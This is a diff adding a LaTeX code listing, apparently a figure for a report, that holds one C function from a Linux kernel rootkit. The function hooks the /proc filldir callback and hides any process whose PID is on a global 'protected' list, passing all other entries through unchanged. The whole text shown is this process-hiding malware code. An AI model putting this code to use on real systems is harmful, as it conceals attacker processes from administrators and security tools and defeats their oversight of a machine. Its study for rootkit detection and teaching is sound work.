@@ -1,0 +1,26 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+\PYG{c+cm}{/**}
+\PYG{c+cm}{ * Replacement function for \PYGZdq{}/proc\PYGZdq{} filldir. Checks to see whether any PIDs}
+\PYG{c+cm}{ * from our global pid\PYGZus{}list are in the buffer. If so, we return 0 to pretend}
+\PYG{c+cm}{ * the PID does not exist. Otherwise we just pass the arguments to the original}
+\PYG{c+cm}{ * filldir function and return its results to preserve functionality.}
+\PYG{c+cm}{ *}
+\PYG{c+cm}{ * @return 0 if a \PYGZsq{}protected\PYGZsq{} pid is detected, otherwise returns \PYGZsq{}normal\PYGZsq{}}
+\PYG{c+cm}{ * filldir results.}
+\PYG{c+cm}{ */}
+\PYG{k}{static} \PYG{k+kt}{int} \PYG{n+nf}{proc\PYGZus{}filldir}\PYG{p}{(}\PYG{k+kt}{void} \PYG{o}{*} \PYG{n}{context}\PYG{p}{,} \PYG{k}{const} \PYG{k+kt}{char} \PYG{o}{*}\PYG{n}{name}\PYG{p}{,} \PYG{k+kt}{int} \PYG{n}{namelen}\PYG{p}{,} \PYG{n}{loff\PYGZus{}t}
+                        \PYG{n}{offset}\PYG{p}{,} \PYG{n}{u64} \PYG{n}{ino}\PYG{p}{,} \PYG{k+kt}{unsigned} \PYG{k+kt}{int} \PYG{n}{d\PYGZus{}type}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+
+    \PYG{k}{struct} \PYG{n}{pid\PYGZus{}entry} \PYG{o}{*}\PYG{n}{p}\PYG{p}{;}
+
+    \PYG{c+c1}{// If buffer contains any PIDs from our list, return 0.}
+    \PYG{n}{list\PYGZus{}for\PYGZus{}each\PYGZus{}entry}\PYG{p}{(}\PYG{n}{p}\PYG{p}{,} \PYG{o}{\PYGZam{}}\PYG{n}{pid\PYGZus{}list}\PYG{p}{,} \PYG{n}{list}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+        \PYG{k}{if} \PYG{p}{(}\PYG{n}{simple\PYGZus{}strtoul}\PYG{p}{(}\PYG{n}{name}\PYG{p}{,} \PYG{n+nb}{NULL}\PYG{p}{,} \PYG{l+m+mi}{10}\PYG{p}{)} \PYG{o}{==} \PYG{n}{p}\PYG{o}{\PYGZhy{}\PYGZgt{}}\PYG{n}{pid}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+            \PYG{k}{return} \PYG{l+m+mi}{0}\PYG{p}{;}
+        \PYG{p}{\PYGZcb{}}
+    \PYG{p}{\PYGZcb{}}
+
+    \PYG{c+c1}{// Otherwise return \PYGZsq{}normal\PYGZsq{} results.}
+    \PYG{k}{return} \PYG{n}{original\PYGZus{}proc\PYGZus{}filldir}\PYG{p}{(}\PYG{n}{context}\PYG{p}{,} \PYG{n}{name}\PYG{p}{,} \PYG{n}{namelen}\PYG{p}{,} \PYG{n}{offset}\PYG{p}{,} \PYG{n}{ino}\PYG{p}{,} \PYG{n}{d\PYGZus{}type}\PYG{p}{);}
+\PYG{p}{\PYGZcb{}}
+\end{Verbatim}
